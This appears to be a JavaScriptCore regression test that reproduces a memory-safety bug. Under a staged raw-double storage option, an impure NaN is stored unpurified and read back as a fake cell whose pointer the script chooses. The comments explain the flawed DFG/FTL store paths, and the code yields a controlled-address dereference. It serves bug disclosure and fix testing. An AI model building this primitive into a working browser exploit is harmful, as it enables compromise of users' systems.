//@ runDefault("--useDoubleFieldRepresentation=1", "--useRawDoubleFieldStorage=1")
//
// Regression test. Reduction, measurement log and the full mechanism write-up live in
// JS-data analysis/prompt/box2d/repro/bugs/01-repro-impure-nan-fake-cell.js and the fix design in that directory's fixes/.
//
// REPRO for bug 01 — an IMPURE NaN stored into a raw-double slot is handed back to JavaScript as a
// JSValue that passes isCell(), with the cell pointer chosen by the script.
//
// Run (WebKit-security/OpenSource):
//   ./Tools/Scripts/run-jsc --release analysis/.../bugs/01-repro-impure-nan-fake-cell.js
//
//   --useRawDoubleFieldStorage=1  (the staged DEFAULT)  -> dies, see below
//   --useRawDoubleFieldStorage=0                        -> prints "ok", rc=0
//
// Two readers, two symptoms, one root cause. Select with PATH_B below.
//   PATH_A (cold C++ read, JSObject::getDirectRawDoubleAware):
//       --ra      : ASSERTION FAILED: !isImpureNaN(d)   at JSCJSValue.h:743   rc=137
//                   ^ an UPSTREAM invariant assert, not one this project added.
//       --release : that assert is compiled out; the fake cell is produced and handed to JS.
//   PATH_B (warmed inline cache, the bare `add DoubleEncodeOffset` in the LLInt/IC reader):
//       both      : EXC_BAD_ACCESS at JSC::JSCell::type(this=0x41414)         rc=139
//                   ^ no assertion on this path in ANY build. The faulting address is
//                     PAYLOAD below, i.e. the pointer is under script control.
//
// MECHANISM
//   JSC encodes a double d as bits(d) + 2^49, and isImpureNaN(d) is defined as exactly "that sum no
//   longer looks like a double" (PureNaN.h:83). For bits(d) >= 0xfffe000000000000 the sum wraps to a
//   small integer whose top 15 bits are clear, so JSValue::isCell() is TRUE and the pointer is the
//   low bits of the NaN payload.
//
//   DFGSpeculativeJIT::compilePutByOffset takes its RawDoubleProof::Raw arm BEFORE the
//   `couldBeType(SpecDoubleImpureNaN) -> purifyNaN` guard; FTL's compilePutByOffset has the same
//   shape. So an impure NaN reaches the slot unpurified. Every JSValue-producing reader then
//   re-applies the bias unconditionally: `.opGetByIdRawDouble` (LowLevelInterpreter64.asm),
//   compileGetByOffset's add64(DoubleEncodeOffset), loadHandlerImpl,
//   InlineAccess::generateSelfPropertyAccess, and JSObject::getDirectRawDoubleAware.
//
//   FTL's compileMultiPutByOffset DOES purify before capturing its unbiased value, so the two store
//   paths that the code repeatedly says must be mirrors are not.

const PATH_B = true;              // false -> exercise the cold C++ reader instead
const PAYLOAD = 0x00041414;       // the address the engine will dereference

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
u32[1] = 0xfffe0000;              // bits = 0xfffe0000_00041414, an impure NaN
u32[0] = PAYLOAD;

const good = new Float64Array(1);
good[0] = 1.5;

function Point(d) { this.x = d; }

// A Float64Array load is the only source of SpecDoubleImpureNaN, and the value must stay unboxed all
// the way into the store -- so the constructor has to be inlined into a DFG-compiled caller.
function make(arr, i) { return new Point(arr[i]); }
noInline(make);

let sink = null;
for (let i = 0; i < 500000; i++)
    sink = make(good, 0);          // marks Point.x RepresentationDouble; gets `make` into the DFG

if (sink.x !== 1.5)
    throw new Error("warmup already wrong: " + sink.x);

function rd(p) { return p.x; }
noInline(rd);

if (PATH_B) {
    // Warm a read site just enough to install the RawDouble inline cache, without tiering it up to a
    // double-result GetByOffset (which would return an unboxed double and re-box nothing).
    let acc = 0;
    for (let i = 0; i < 40; i++)
        acc += rd(sink);
    if (acc !== 60)
        throw new Error("warm read wrong: " + acc);
}

const bad = make(f64, 0);          // impure NaN stored raw, unpurified

const v = PATH_B ? rd(bad) : bad.x;

if (typeof v !== "number")
    throw new Error("bad.x is not a number: " + typeof v);
print("ok: read back " + v);
